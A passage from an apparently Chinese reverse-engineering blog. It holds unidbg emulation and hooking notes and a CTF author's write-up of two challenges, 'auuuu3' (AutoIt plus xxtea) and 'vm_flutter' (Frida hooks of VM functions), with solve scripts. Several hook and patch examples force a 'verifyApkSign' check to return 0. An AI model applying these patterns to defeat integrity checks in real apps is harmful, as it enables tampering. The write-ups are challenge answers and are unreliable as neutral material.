emulator.traceCode(1,0); // 是否正在运行 boolean running = emulator.isRunning();&#125;# Memory 操作 public void Memory_use()&#123; Memory memory = emulator.getMemory(); // 指定 Android SDK 版本 memory.setLibraryResolver(new AndroidResolver(23)); // 拿到一个指针，指向内存地址，通过该指针可操作内存 UnidbgPointer pointer = memory.pointer(0x4000000); // 获取当前内存映射情况 Collection&lt;MemoryMap> memoryMap = memory.getMemoryMap(); // 根据模块名来拿到某个模块 Module module = memory.findModule(\"module name\"); // 根据地址拿到某个模块 Module module = memory.findModuleByAddress(0x40000000);&#125;# VM 操作 public void VM_use()&#123; // 推荐指定 APK 文件，Unidbg 会自动做许多固定的操作 VM vm = emulator.createDalvikVM(new File(\"E:\\\\oacia\\\\my.apk\")); // 是否输出 JNI 运行日志 vm.setVerbose(true); // 加载 SO 模块 参数二设置是否自动调用 init 函数 DalvikModule dalvikModule = vm.loadLibrary(new File(\"E:\\\\oacia\\\\libc.so\"), true); // 设置 JNI 交互接口 参数需实现 Jni 接口，推荐使用 this 继承 AbstractJni vm.setJni(this); // 获取 JNIEnv 指针，可作为参数传递 Pointer jniEnv = vm.getJNIEnv(); // 获取 JavaVM 指针，可作为参数传递 Pointer javaVM = vm.getJavaVM(); // 调用 JNI_OnLoad 函数 vm.callJNI_OnLoad(emulator,dalvikModule.getModule()); // 向 VM 添加全局对象，返回该对象的 hash 值 int hash = vm.addGlobalObject(dvmObj); // 获取虚拟机中的对象，参数为该对象的 hash 值 DvmObject&lt;?> object = vm.getObject(hash);&#125;# 方法调用 # 调用导出函数 // 调用导出函数public void call_export_function()&#123; Module oacia_module = vm.loadLibrary(new File(\"E:/oacia/liboacia.so\"),false).getModule(); Number result = oacia_module.callFunction(emulator,\"_Z3addii\", 1,2); System.out.println(\"_Z3addii result:\"+result.intValue());&#125;# 调用 JNI 函数 // 调用 JNI 函数public void call_JNI_function()&#123; // 调用 jni 函数，对于动态注册的 jni 函数必须在完成地址的绑定才能调用 DvmClass MainActivity_dvmclass = vm.resolveClass(\"com/example/unicorncourse08/MainActivity\");// 先把类找到，这里的原理很像反射 DvmObject&lt;?> resultobj = MainActivity_dvmclass.callStaticJniMethodObject(emulator,\"stringFromJNI1(Ljava/lang/String;)Ljava/lang/String;\",\"helloworld\");// 再通过类去调用里面的函数 System.out.println(\"resultobj:\"+resultobj);&#125;# 调用任意函数 // 调用任意函数public void call_any_function()&#123; // 获取 JNIEnv * Pointer jniEnv = vm.getJNIEnv(); // 创建 jobject 对象 DvmObject&lt;?> thiz = vm.resolveClass(\"com.oacia.test\").newObject(null); // 准备入参 List&lt;Object> args = new ArrayList&lt;>(); args.add(jniEnv); args.add(vm.addLocalObject(thiz)); args.add(vm.addLocalObject(new StringObject(vm,\"XuE\"))); // 根据地址调用 Number numbers = module.callFunction(emulator, 0x9180 + 1, args.toArray()); System.out.println(numbers.intValue());&#125;# 调用形参是指针类型的函数 // 调用形参是指针类型的函数// 假设我们需要调用的函数为 void md5 (const uint8_t *initial_msg, size_t initial_len, uint8_t *digest);// 其中 initial_msg 和 digest 都是指针类型public void call_argv_point_type_function()&#123; String initial = \"unidbg\"; int initial_length = initial.length(); // 开辟一块的空间来存放第一个参数 MemoryBlock initial_msg = emulator.getMemory().malloc(initial_length+1, false); UnidbgPointer initial_msg_ptr = initial_msg.getPointer(); // 将参数 1 写入 initial_msg_ptr.write(initial.getBytes()); // 开辟一块 16 字节的空间来存放第 2 个参数 MemoryBlock digest = emulator.getMemory().malloc(16, false); UnidbgPointer digest_ptr=digest.getPointer(); // 准备入参 List&lt;Object> args = new ArrayList&lt;>(); args.add(initial_msg); args.add(initial_length); args.add(digest_ptr); // 执行 module.callFunction(emulator, 0x7A8D + 1, args.toArray()); // 打印结果 Inspector.inspect(digest_ptr.getByteArray(0, 0x10), \"digest\");&#125;# unidbg hook Unidbg 在 Android 上支持的 Hook，可以分为两大类 Unidbg 内置的第三方 Hook 框架，包括 xHook/Whale/HookZz Unicorn Hook 以及 Unidbg 基于它封装的 Console Debugger 选用哪种 hook 框架，可以参考以下两点 如果以模拟执行为目的，建议使用第三方 Hook 方案，arm32 下 HookZz 的支持较好，arm64 下 Dobby 的支持较好，HookZz/Dobby Hook 不成功时，如果函数是导出函数，使用 xHook，否则使用 Whale。 如果以算法还原为目的，建议使用 Console Debugger 和 Unicorn Hook，并建议不优先使用第三方 Hook 方案。 # 基础知识 # 获取 so 的基址 加载一个 so // 加载 so 到虚拟内存DalvikModule dm = vm.loadLibrary(\"libnative-lib.so\", true);// 加载好的 so 对应为一个模块module = dm.getModule();// 打印 libnative-lib.so 在 Unidbg 虚拟内存中的基地址System.out.println(\"baseAddr:\"+module.base);加载多个 so // 获取某个具体 SO 的句柄Module yourModule = emulator.getMemory().findModule(\"yourModuleName\");// 打印其基地址System.out.println(\"baseAddr:\"+yourModule.base);如果只主动加载一个 so，其基址恒为 0x40000000 , 这是一个检测 Unidbg 的点，可以在 com/github/unidbg/memory/Memory.java 中做修改 public interface Memory extends IO, Loader, StackMemory &#123; long STACK_BASE = 0xc0000000L; int STACK_SIZE_OF_PAGE = 256; // 1024k // 修改内存映射的起始地址 long MMAP_BASE = 0x40000000L; UnidbgPointer allocateStack(int size); UnidbgPointer pointer(long address); void setStackPoint(long sp);&#125;# 获取导出函数地址 // 加载 so 到虚拟内存DalvikModule dm = vm.loadLibrary(\"libnative-lib.so\", true);// 加载好的 libnative-lib.so 对应为一个模块module = dm.getModule();int address = (int) module.findSymbolByName(\"funcNmae\").getAddress();# 获取非导出函数地址 // 加载 so 到虚拟内存DalvikModule dm = vm.loadLibrary(\"libnative-lib.so\", true);// 加载好的 so 对应为一个模块module = dm.getModule();//offset，在 IDA 中查看int offset = 0x1768;// 真实地址 = baseAddr + offsetint address = (int) (module.base + offset);# Console Debugger # 基础 hook 使用 Console Debugger 下断点 // debugemulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress()); 运行到对应地址时触发断点，类似于 GDB 调试或者 IDA 调试，时机为目标指令执行前 Console Debugger 用于辅助算法分析，快速分析、确认某个函数的功能。并且只能在 Unicorn 引擎下才可以使用 交互命令 c: continuen: step overbt: back tracest hex: search stackshw hex: search writable heapshr hex: search readable heapshx hex: search executable heapnb: break at next blocks|si: step intos[decimal]: execute specified amount instructions(blx): execute util BLX mnemonic, low performancem(op) [size]: show memory, default size is 0x70, size may hex or decimalmr0-mr7, mfp, mip, msp [size]: show memory of specified registerm(address) [size]: show memory of specified address, address must start with 0xwr0-wr7, wfp, wip, wsp &lt;value>: write specified registerwb(address), ws(address), wi(address) &lt;value>: write (byte, short, integer) memory of specified address, address must start with 0xwx(address) &lt;hex>: write bytes to memory at specified address, address must start with 0xb(address): add temporarily breakpoint, address must start with 0x, can be module offsetb: add breakpoint of register PCr: remove breakpoint of register PCblr: add temporarily breakpoint of register LRp (assembly): patch assembly at PC addresswhere: show java stack tracetrace [begin end]: Set trace instructionstraceRead [begin end]: Set trace memory readtraceWrite [begin end]: Set trace memory writevm: view loaded modulesvbs: view breakpointsd|dis: show disassembled(0x): show disassemble at specify addressstop: stop emulationrun [arg]: run testcc size: convert asm from 0x400008a0 - 0x400008a0 + size bytes to c function持久化 hook onHit 返回 ture 时，断点触发时不会进入交互界面；为 false 时会。当函数被调用了三五百次时，我们不希望它反复停下来，然后不停 “c” 来继续运行。 public void HookByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; RegisterContext context = emulator.getContext(); Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); Pointer buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); // OnLeave emulator.attach().addBreakPoint(context.getLRPointer().peer, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; String result = buffer.getString(0); System.out.println(\"base64 result:\"+result); return true; &#125; &#125;); return true; &#125; &#125;);&#125;# 修改参数 下断点，运行代码后进入 debugger emulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress()); 通过命令修改参数 1 和 2 wx0x40002403 68656c6c6f20776f726c64>-----------------------------------------------------------------------------&lt;[14:06:46 165]RX@0x40002403[libhookinunidbg.so]0x2403, md5=5eb63bbbe01eeed093cb22bb8f5acdc3, hex=68656c6c6f20776f726c64size: 110000: 68 65 6C 6C 6F 20 77 6F 72 6C 64 hello world^-----------------------------------------------------------------------------^wr1 11>>> r1=0xbConsole Debugger 支持下列写操作 wr0-wr7, wfp, wip, wsp &lt;value>: write specified registerwb(address), ws(address), wi(address) &lt;value>: write (byte, short, integer) memory of specified address, address must start with 0xwx(address) &lt;hex>: write bytes to memory at specified address, address must start with 0x持久化中的修改参数 public void ReplaceArgByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"base64_encode\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; RegisterContext context = emulator.getContext(); String fakeInput = \"hello world\"; int length = fakeInput.length(); // 修改 r1 值为新长度 emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R1, length); MemoryBlock fakeInputBlock = emulator.getMemory().malloc(length, true); fakeInputBlock.getPointer().write(fakeInput.getBytes(StandardCharsets.UTF_8)); // 修改 r0 为指向新字符串的新指针 emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, fakeInputBlock.getPointer().peer); Pointer buffer = context.getPointerArg(2); // OnLeave emulator.attach().addBreakPoint(context.getLRPointer().peer, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; String result = buffer.getString(0); System.out.println(\"base64 result:\"+result); return true; &#125; &#125;); return true; &#125; &#125;);&#125;# 修改返回值 public void ReplaceRetByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"verifyApkSign\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; RegisterContext context = emulator.getContext(); // OnLeave emulator.attach().addBreakPoint(context.getLRPointer().peer, new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, 0); return true; &#125; &#125;); return true; &#125; &#125;);&#125;# 替换函数 public void ReplaceFuncByConsoleDebugger()&#123; emulator.attach().addBreakPoint(module.findSymbolByName(\"verifyApkSign\").getAddress(), new BreakPointCallback() &#123; @Override public boolean onHit(Emulator&lt;?> emulator, long address) &#123; System.out.println(\"替换函数 verifyApkSign\"); RegisterContext registerContext = emulator.getContext(); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC, registerContext.getLRPointer().peer); emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, 0); return true; &#125; &#125;);&#125;# Unicorn Hook public void HookByUnicorn()&#123; long start = module.base+0x97C; long end = module.base+0x97C+0x17A; emulator.getBackend().hook_add_new(new CodeHook() &#123; @Override public void hook(Backend backend, long address, int size, Object user) &#123; RegisterContext registerContext = emulator.getContext(); if(address == module.base + 0x97C)&#123; int r0 = registerContext.getIntByReg(ArmConst.UC_ARM_REG_R0); System.out.println(\"0x97C 处 r0:\"+Integer.toHexString(r0)); &#125; //capstone 引擎的使用 Capstone capstone = new Capstone(Capstone.CS_ARCH_ARM64,Capstone.CS_MODE_ARM); byte[] bytes = emulator.getBackend().mem_read(address, 4); Instruction[] disasm = capstone.disasm(bytes, 0); &#125; @Override public void onAttach(Unicorn.UnHook unHook) &#123; &#125; @Override public void detach() &#123; &#125; &#125;, start, end, null);&#125;# xHook xHook 是爱奇艺开源的 Android PLT hook 框架，优点是挺稳定好用，缺点是不能 Hook Sub_xxx 子函数。 # 基础 hook public void HookByXhook()&#123; IxHook xHook = XHookImpl.getInstance(emulator); xHook.register(\"libhookinunidbg.so\", \"base64_encode\", new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?> emulator, HookContext context, long originFunction) &#123; Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); Pointer buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); context.push(buffer); return HookStatus.RET(emulator, originFunction); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookContext context) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;, true); // 使其生效 xHook.refresh();&#125;# 修改参数 public void ReplaceArgByXhook()&#123; IxHook xHook = XHookImpl.getInstance(emulator); xHook.register(\"libhookinunidbg.so\", \"base64_encode\", new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?> emulator, HookContext context, long originFunction) &#123; String fakeInput = \"hello world\"; int length = fakeInput.length(); // 修改 r1 值为新长度 emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R1, length); MemoryBlock fakeInputBlock = emulator.getMemory().malloc(length, true); fakeInputBlock.getPointer().write(fakeInput.getBytes(StandardCharsets.UTF_8)); // 修改 r0 为指向新字符串的新指针 emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_R0, fakeInputBlock.getPointer().peer); Pointer buffer = context.getPointerArg(2); context.push(buffer); return HookStatus.RET(emulator, originFunction); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookContext context) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;, true); // 使其生效 xHook.refresh();&#125;# 替换函数 public void ReplaceFuncByHookZz()&#123; HookZz hook = HookZz.getInstance(emulator); hook.replace(module.findSymbolByName(\"verifyApkSign\").getAddress(), new ReplaceCallback() &#123; @Override public HookStatus onCall(Emulator&lt;?> emulator, HookContext context, long originFunction) &#123; emulator.getBackend().reg_write(Unicorn.UC_ARM_REG_R0,0); return HookStatus.RET(emulator,context.getLR()); &#125; &#125;);&#125;# HookZz HookZz 现在叫 Dobby，Unidbg 中是 HookZz 和 Dobby 是两个独立的 Hook 库，因为作者认为 HookZz 在 arm32 上支持较好，Dobby 在 arm64 上支持较好。HookZz 是 inline hook 方案，因此可以 Hook Sub_xxx，缺点是短函数可能出 bug，受限于 inline Hook 原理。 # 基础 hook public void HookByHookZz()&#123; IHookZz hookZz = HookZz.getInstance(emulator); // 加载 HookZz，支持 inline hook hookZz.enable_arm_arm64_b_branch(); // 测试 enable_arm_arm64_b_branch，可有可无 hookZz.wrap(module.findSymbolByName(\"base64_encode\"), new WrapCallback&lt;HookZzArm32RegisterContext>() &#123; @Override public void preCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); Pointer buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); context.push(buffer); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;); hookZz.disable_arm_arm64_b_branch();&#125;# 修改参数 public void ReplaceArgByHookZz()&#123; IHookZz hookZz = HookZz.getInstance(emulator); // 加载 HookZz，支持 inline hook hookZz.enable_arm_arm64_b_branch(); // 测试 enable_arm_arm64_b_branch，可有可无 hookZz.wrap(module.findSymbolByName(\"base64_encode\"), new WrapCallback&lt;HookZzArm32RegisterContext>() &#123; @Override public void preCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer input = context.getPointerArg(0); String fakeInput = \"hello world\"; input.setString(0, fakeInput); context.setR1(fakeInput.length()); Pointer buffer = context.getPointerArg(2); context.push(buffer); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookZzArm32RegisterContext context, HookEntryInfo info) &#123; Pointer buffer = context.pop(); System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;); hookZz.disable_arm_arm64_b_branch();&#125;# Whale Whale 是一个跨平台的 Hook 框架，在 Andorid Native Hook 上也是 inline Hook 方案 public void HookByWhale()&#123; IWhale whale = Whale.getInstance(emulator); whale.inlineHookFunction(module.findSymbolByName(\"base64_encode\"), new ReplaceCallback() &#123; Pointer buffer; @Override public HookStatus onCall(Emulator&lt;?> emulator, long originFunction) &#123; RegisterContext context = emulator.getContext(); Pointer input = context.getPointerArg(0); int length = context.getIntArg(1); buffer = context.getPointerArg(2); Inspector.inspect(input.getByteArray(0, length), \"base64 input\"); return HookStatus.RET(emulator, originFunction); &#125; @Override public void postCall(Emulator&lt;?> emulator, HookContext context) &#123; System.out.println(\"base64 result:\"+buffer.getString(0)); &#125; &#125;, true);&#125;# unidbg 常用脚本 # Patch 方法一 public void Patch1()&#123; // 00 20 00 bf int patchCode = 0xBF002000; // movs r0,0 emulator.getMemory().pointer(module.base + 0x8CA).setInt(0,patchCode);&#125; 方法二 public void Patch2()&#123; byte[] patchCode = &#123;0x00, 0x20, 0x00, (byte) 0xBF&#125;; emulator.getBackend().mem_write(module.base + 0x8CA, patchCode);&#125; 方法三 public void Patch3()&#123; try (Keystone keystone = new Keystone(KeystoneArchitecture.Arm, KeystoneMode.ArmThumb)) &#123; KeystoneEncoded encoded = keystone.assemble(\"movs r0,0;nop\"); byte[] patchCode = encoded.getMachineCode(); emulator.getMemory().pointer(module.base + 0x8CA).write(0, patchCode, 0, patchCode.length); &#125;&#125; # 内存检索 public void SearchAndPatch()&#123; byte[] patterns = &#123;(byte) 0x80, (byte) 0xb5,0x6f,0x46, (byte) 0x84, (byte) 0xb0,0x03, (byte) 0x90,0x02, (byte) 0x91&#125;; Collection&lt;Pointer> pointers = searchMemory(module.base, module.base+module.size, patterns); if(pointers.size() > 0)&#123; try (Keystone keystone = new Keystone(KeystoneArchitecture.Arm, KeystoneMode.ArmThumb)) &#123; KeystoneEncoded encoded = keystone.assemble(\"movs r0,0;nop\"); byte[] patchCode = encoded.getMachineCode(); ((ArrayList&lt;Pointer>) pointers).get(0).write(10, patchCode, 0, patchCode.length); &#125; &#125;&#125;private Collection&lt;Pointer> searchMemory(long start, long end, byte[] data) &#123; List&lt;Pointer> pointers = new ArrayList&lt;>(); for (long i = start, m = end - data.length; i &lt; m; i++) &#123; byte[] oneByte = emulator.getBackend().mem_read(i, 1); if (data[0] != oneByte[0]) &#123; continue; &#125; if (Arrays.equals(data, emulator.getBackend().mem_read(i, data.length))) &#123; pointers.add(UnidbgPointer.pointer(emulator, i)); i += (data.length - 1); &#125; &#125; return pointers;&#125;# 参考资料 Unidbg 文档更新 (一) Unidbg 文档慢更 (二) Unidbg Hook 大全","categories":[],"tags":[]},{"title":"CBCTF auuuu3和vm_flutter出题思路及wp","slug":"CBCTF-2023","date":"2023-10-23T06:42:47.000Z","updated":"2025-04-08T18:55:11.333Z","comments":true,"path":"CBCTF-2023/","link":"","permalink":"https://oacia.dev/CBCTF-2023/","excerpt":"","text":"去年 CBCTF 的时候，我当时为这个比赛出了一道逆向题叫做 CBNET , 可是直到结束之后才终于有了一解，我那时非常自责，感觉自己把题目出难了导致大家都做不出来，那次比赛结束之后几个师傅找我问这题，我发现原来是我自己设计的自定义算法难住了大家，大家不会写逆向脚本导致的。所以今年的 CBCTF, 我总结了去年出题的经验，给自己今年出题定的目标的就是希望每一个人都可以去尝试着去做一下，并且不在算法的层面去为难大家. auuuu3 的出题灵感主要在上半年看到过一篇文章，说是有 hacker 在压缩包里藏了一个无毒的 autoit exe 解释器，然后这个解释器运行恶意的 au3 脚本来实现恶意行为，当时我就在想要是把这个 au3 脚本编译成 exe 之后会不会很有趣呢～所以就开始了尝试，写了一个 demo 自己做了一下，发现直接用 ida 逆向的难度相当的高，需要极强的逆向水平才可以做出来，所以我就去网上寻找可以逆向 autoit 的工具，一开始用官方自带的 exe2aut 是可以成功得到源码的，随后我去翻看了 autoit 官方的文档，发现这个 exe2aut 在 autoitv3.2.5.1 之后就被移除了，为了稍稍增加一些难度，所以我就选用了高版本的 autoit 来编译 exe, 然后就发现不管是官方的 exe2aut, 还是 github 上高 star 的 AutoDec , autoitqds , myAut2Exe 这些工具全部都反编译源码报错了，正当我担心自己又要把中等题出成困难题的时候，我又发现了一个工具，他叫 autoit-ripper , 可以完美的反编译高版本的 autoit, 思路也是解析 autoit 虚拟机，有兴趣的可以去看一看它的源码，还是挺有趣的，至于逆向算法，我仅仅是用 shellcode 加载了一个 dll, 这个 dll 里面也只有一个 xxtea, 应该逆向起来是非常轻松的 vm_flutter 的出题灵感是我在八月末做完腾讯游戏安全竞赛安卓初赛题之后，对这题中的 vm 有了较深的感悟之后决定设计的，在解那题的 vm 的时候，我对于它的 opcode 指令真的是全然不知，所以我去 hook 了 vm 相关的函数成功的解出了 vm, 要是想看这场比赛题解的可以移步我博客的这篇文章。回到 vm_flutter, 这题在比赛结束之后只有一解我感觉其实挺意外的，应该可以有更多人可以做出来这题。出 vm_flutter 的时候，我想要设计一个大家不知道 opcode 的环境，我想最好的方法就是用 flutter 框架，然后把 opcode 放在 dart 层中，但是我又希望大家可以很快的找出 vm 的函数比如 push , pop , add 等等函数所在的位置，所以我将这些函数全部都定义在了 java 层中，这样大家用 jadx 或 jeb 反编译之后，就可以很快找到他们了。接下来的需要解决的问题就是如何让 flutter 的 dart 层去调用原生安卓中的 java 层中的函数，这里我用的方法是我上半年在逆向一个 flutter 框架的游戏叫做装扮少女的时候学习到的，这个 app 使用 MethodChannel 管道通信的方式实现 dart 层和原生安卓之间的通信，而通讯的消息我也没有修改，甚至字符串都是 vm 有关的字符串。但是方法名混淆其实是在我的预期之外，这其实是 build apk 的时候 flutter 自动把方法名混淆了的，不是我干的！！(本来我是想让大家一下就可以知道 java 层函数的含义的), 然后我还把最终的 check 函数也放在了 java 层中，而不是在 vm 中去 check,dart 层通过 check 的结果去弹出 right 或 wrong, 所以这样应该能更加降低大家解题的难度了～ # auuuu3 本题是由 autoit 编写而成的 exe，本质上也是一个虚拟机，通过解析 autoit 动态脚本语言来执行命令，倘若使用 IDA 或 od 直接逆向，那么是需要花费一段时间在这题上的。并且根据官方的说法，在 v3.2.5.1 之后的 autoit 版本中将不再拥有自带的反编译工具，本题所使用的 autoit 版本在 v3.2.5.1 之上。 不过好在已经有人帮助我们分析出了虚拟指令对应的含义，我们直接使用工具即可快速得到源码。 查壳，这是用 autoit 编译而成的 exe，无壳。 使用 AutoIt-Ripper 得到该 exe 的源码 https://github.com/nazywam/AutoIt-Ripper 通过搜索字符串 wrong 定位到关键函数 分析加密流程，首先判断输入是否满足 38 位，如果满足，则将输入经过 ENC 函数加密， ENC 函数如下 Func ENC ( $DATA , $KEY ) $DATA = Binary ( $DATA ) Local $DATALEN = BinaryLen ( $DATA ) If $DATALEN = 0 Then Return \"\" ElseIf $DATALEN &lt; 8 Then $DATALEN = 8 EndIf Local $OPCODE = \"0x83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000\" Local $CODEBUFFER = DllStructCreate ( \"byte[\" &amp; BinaryLen ( $OPCODE ) &amp; \"]\" ) DllStructSetData ( $CODEBUFFER , 1 , $OPCODE ) Local $V = DllStructCreate ( \"byte[\" &amp; Ceiling ( $DATALEN / 4 ) * 4 &amp; \"]\" ) DllStructSetData ( $V , 1 , $DATA ) Local $K = DllStructCreate ( \"byte[16]\" ) DllStructSetData ( $K , 1 , $KEY ) DllCall ( \"user32.dll\" , \"none\" , \"CallWindowProc\" , \"ptr\" , DllStructGetPtr ( $CODEBUFFER ) , \"ptr\" , DllStructGetPtr ( $V ) , \"int\" , Ceiling ( $DATALEN / 4 ) , \"ptr\" , DllStructGetPtr ( $K ) , \"int\" , 0 ) Local $RET = DllStructGetData ( $V , 1 ) $CODEBUFFER = 0 $V = 0 $K = 0 Return $RETEndFunc可以发现函数动态加载了一个 dll, 然后从 dll 调用加密函数进行加密 使用如下脚本将 OPCODE 以字节的形式写入文件，方便使用 IDA 进行分析 import binasciiopcode = \"83EC14B83400000099538B5C2420558B6C242056578B7C9DFCF7FB89C683C606C74424180000000085F68D76FF0F8EEA000000896C24288D4BFF8D549D00894C2410895424148974242081442418B979379E8B4C2418C1E90281E103000000894C241C31F6397424107E568B5424288BCF8B6CB204C1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D333CA8B542428010CB28B0CB2463974241089CF7FAA8B5424288BCF8B2AC1E9058D14AD0000000033CA8BD58BC7C1EA03C1E00433D003CA8B5424188BDE81E303000000335C241C8B4424308B1C9833D533DF03D3FF4C242033CA8B542414014AFC8B4AFC8B54242089CF420F8F2DFFFFFF5F31C05E5D5B83C414C21000\"hex_bytes = binascii.a2b_hex(opcode)with open(\"enc.dll\",'wb') as f: f.write(hex_bytes)伪代码如下，可以发现加密算法为 xxtea 编写 exp 得到 flag import binasciifrom ctypes import *import structdef MX(z, y, total, key, p, e): temp1 = (z.value >> 5 ^ y.value &lt;&lt; 2) + (y.value >> 3 ^ z.value &lt;&lt; 4) temp2 = (total.value ^ y.value) + (key[(p &amp; 3) ^ e.value] ^ z.value) return c_uint32(temp1 ^ temp2)def decrypt(n, v, key): delta = 0x61C88647 rounds = 6 + 52 // n total = c_uint32(-rounds * delta) y = c_uint32(v[0]) e = c_uint32(0) while rounds > 0: e.value = (total.value >> 2) &amp; 3 for p in range(n - 1, 0, -1): z = c_uint32(v[p - 1]) v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value y.value = v[p] z = c_uint32(v[n - 1]) v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value y.value = v[0] total.value += delta rounds -= 1 return vif __name__ == \"__main__\": ct = \"7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675\" ct = binascii.a2b_hex(ct) flag = \"\" key = \"Wowww111auUu3\" v = struct.unpack('&lt;10I', ct) k = struct.unpack('&lt;4I', key.encode() + b'\\x00' * 3) v = list(v) k = list(k) n = 10 res = decrypt(n, v, k) for r in res: print(r.to_bytes(4, 'little').decode(), end='')# vm_flutter 虽然这个 apk 是使用 flutter 编写的，但是其实在本题中 flutter 仅仅是纸老虎般的存在。 在本题的题目描述中给出了两个提示，第一是对 flag 的加密算法有且只有一个 vm，第二是全部 vm 相关的函数都定义在 Java 层中，dart 层仅仅只是调用 java 层中定义的函数。所以根据这两个提示，就可以联想到使用 frida 等 hook 框架去 hook java 层中 vm 相关的函数，打印出虚拟指令来进行分析，如果可以想到这一点，那么这题就迎刃而解了。倘若使用 reflutter 等 flutter 逆向工具，那么将会在 dart 虚拟机中越陷越深：( 在本题中，opcode 是在 dart 层被定义的，但是这其实无关紧要，因为 vm 相关的函数是在 java 层中定义的，我们对 vm 函数 hook 的过程其实就是对 opcode 的 “解读” 过程，通过 hook 的操作，我们就可以将 vm 对内部栈或内存的操作映射为可读的、可以理解的虚拟指令来进行分析。 所以设计本题也是基于这种思想，使用目前安卓层面逆向难度非常高的 flutter 框架，来模拟类似 vmprotect 这类强壳 opcode 未知的场景，甚至在 vmprotect 中 opcode 会在间隔不定时间后随机变换。虽然我们不知道 opcode，但是万变不离其宗，vm 解析 opcode 之后最终要执行的操作是不会变的。 获取 flag 的过程如下 使用 jadx 反编译，发现方法名被混淆，但是进入 com.dasctf.vm_flutter.vm_flutter.MainActivity 可以看到 vm 相关的字符串 通过给 c2 赋不同的值来调用 vm 中的函数 根据字符串的提示，我们便知道了被混淆的 vm 的函数都是什么含义 同时我们还在这里发现了最终的校验函数，可以推测最终的 flag 应该有 33 位 使用 frida hook vm 函数来获取 vm 指令 function hook()&#123; Java.perform(function()&#123; const activity = Java.use(\"k.b\"); activity.a.implementation = function()&#123; console.log(\"Lshift\"); &#125; activity.b.implementation = function()&#123; console.log(\"Rshift\"); &#125; activity.c.implementation = function()&#123; console.log(\"add\"); &#125; activity.d.implementation = function()&#123; console.log(\"and\"); &#125; activity.e.implementation = function(x)&#123; console.log(\"load \"+x); &#125; activity.f.implementation = function()&#123; console.log(\"mul\"); &#125; activity.g.implementation = function()&#123; console.log(\"or\"); &#125; activity.h.implementation = function()&#123; console.log(\"pop\"); &#125; activity.i.implementation = function(x)&#123; console.log(\"push \"+x); &#125; activity.j.implementation = function(x)&#123; console.log(\"store \"+x); &#125; activity.k.implementation = function()&#123; console.log(\"sub\"); &#125; activity.l.implementation = function()&#123; console.log(\"xor\"); &#125; &#125;)&#125;setImmediate(hook,0);使用下列命令注入脚本 frida -U -l .\\hook.js -f &quot;com.dasctf.vm_flutter.vm_flutter&quot; 我们输入 33 位的数字，例如 000000000000000000000000000000000 ,frida 打印的内容如下 push 48store 0push 176push 11load 0addxorstore 0push 48store 1push 198push 18load 1addxorstore 1push 48store 2push 66push 5load 2addxorstore 2push 48store 3push 199push 18load 3addxorstore 3push 48store 4push 170push 14load 4addxorstore 4push 48store 5push 32push 13load 5addxorstore 5push 48store 6push 31push 14load 6addxorstore 6push 48store 7push 60push 18load 7addxorstore 7push 48store 8push 26push 13load 8addxorstore 8push 48store 9push 89push 18load 9addxorstore 9push 48store 10push 60push 17load 